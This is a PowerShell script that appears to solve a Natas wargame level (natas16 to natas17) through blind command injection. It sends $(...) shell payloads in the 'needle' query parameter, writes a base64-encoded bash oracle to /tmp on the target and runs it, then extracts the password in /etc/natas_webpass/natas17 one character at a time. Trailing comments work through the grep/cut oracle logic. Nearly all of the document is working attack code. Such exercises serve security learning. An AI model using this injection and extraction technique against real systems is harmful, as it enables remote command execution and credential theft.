param (
    [Parameter(Mandatory = $true)]
    [string]$server,
    [Parameter(Mandatory = $true)]
    [string]$username,
    [Parameter(Mandatory = $true)]
    [string]$password
)
$url = $server

$pair = "${username}:${password}"
$bytes = [System.Text.Encoding]::ASCII.GetBytes($pair)
$base64 = [System.Convert]::ToBase64String($bytes)
$authorization = "Basic $base64"

$headers = @{
    "Authorization" = $authorization
    "Content-Type"  = "application/x-www-form-urlencoded"
} 

$correctStr = "British"
$wrongStr = "Africa"

$lowercaseChars = 97..122 | ForEach-Object { [char]$_ }
$uppercaseChars = 65..90 | ForEach-Object { [char]$_ }
$numbers = 48..57 | ForEach-Object { [char]$_ }

$all_characters = $lowercaseChars + $uppercaseChars + $numbers

function Send_Command {
    param (
        [Parameter(Mandatory = $true)]
        [string]$command
    )
    if ($command) {
        $curl = $server + "/?needle=$command&submit=Search"     
        $curl = [URI]::EscapeUriString($curl)

        $response = Invoke-WebRequest -URI $curl -Headers $headers -Method 'GET' -UseBasicParsing
        if (!$response) {
            Write-Host "Error!"
            exit
        }
        return $response
    }
}
$BlindInjectionCommand = 'cut -c 2 <<<$(grep $(grep $(grep $(echo $1) <<<$(cut -c $2 $3)) <<<$(echo $1)) <<<$(echo $1\B))'
#'cut -c 2 <<<$(grep $(grep $(grep $(echo $1) <<<$(cut -c $2 $3)) <<<$(echo $1)) <<<$(echo $1\B))'
#    					  '$(cut -c 2 <<<$(grep $(grep $(grep $(echo $1) <<<$(cut -c $2 $3)) <<<$(echo $1)) <<<$(echo $1\B)))'

#Convert the Command to be executed like $(bash $BlindInjectionCommand $ARG1 $ARG2 $ARG3)
$Bytes = [System.Text.Encoding]::UTF8.GetBytes($BlindInjectionCommand)
$b64BASHCOMMAND = [Convert]::ToBase64String($Bytes)

$command = '$(echo ' + $b64BASHCOMMAND + ' > /tmp/myb64tmp)'
$response = Send_Command -command $command

$command = '$(base64 -d /tmp/myb64tmp > /tmp/myb64decoded)'
$response = Send_Command -command $command


$FileName = '/etc/natas_webpass/natas17'
$result = ""
for ($position = 1; $position -le 32; $position ++) {    
    foreach ($char in $all_characters) {  	 
        #3:
        #just do Send-Command -command $command -char $character
        $command = '$(bash /tmp/myb64decoded ' + $char + ' ' + $position + ' ' + $FileName + ')'
        $response = Send_Command -command $command
        if ($response) {
            if ($response.Content -like "*$correctStr*") {
                if ($response.Content -notlike "*$wrongStr*") {
                    $result += $char
                    Write-Host "Char $position" + ": $char"
                    break
                }
            }
        }
    }
}

write-host `n"PASSWORD: $result"

<#

#CHAR   	 #POSITION+#FILE    		 #CHAR 		 #CHAR+'B'		 
$(cut -c 2 <<< $(grep $(grep $(grep "a" <<< $(cut -c 2 password)) <<< $(echo a)) <<< $(echo aB)))

$(cut -c 2 <<< $(grep $(grep $(grep "a" <<< $(cut -c 1 password)) <<< $(echo a)) <<< $(echo aB)))
# cut -c 2 <<< $(grep $(grep $(grep "a" <<< $(cut -c 2 password)) <<< $(echo a)) <<< $(echo aB))
# grep $(grep $(grep $(grep "a" <<< $(cut -c 2 password)) <<< $(echo a)) <<< $(echo aB)) <<< $(echo B)
# grep $(grep $(grep "a" <<< $(cut -c 2 password)) <<< $(echo a)) <<< $(echo aB)



grep -i $(grep -i $(grep -i "a" <<< cut -c 1 password) <<< $(echo a)) <<< $(echo "B")

#if something returned, then ECHO B|||||
grep -i $(grep -i $(grep -i "a" <<< cut -c 1 password) <<< $(echo a)) <<< $(echo "B") #  grep $(grep $(grep "p" <<< $(cut -c 1 password)) <<< $(echo p)) <<< $(echo "B")

# then return SOMETHING   	 #CHAR
grep -i $(grep -i "p" <<< cut -c 1 password) <<< $(echo p)      		 #  	 -> grep $(grep "p" <<< $(cut -c 1 password)) <<< $(echo p)
#CHAR   	 #POSITION
$(grep -i "p" <<< cut -c 1 password) # if (CHAR exists in PASSWORDCHARACTER(POSITION))



#CHAR = 'a'
#or
#CHAR = ''

grep -i "1" <<< $(cut -c1 password)
#>


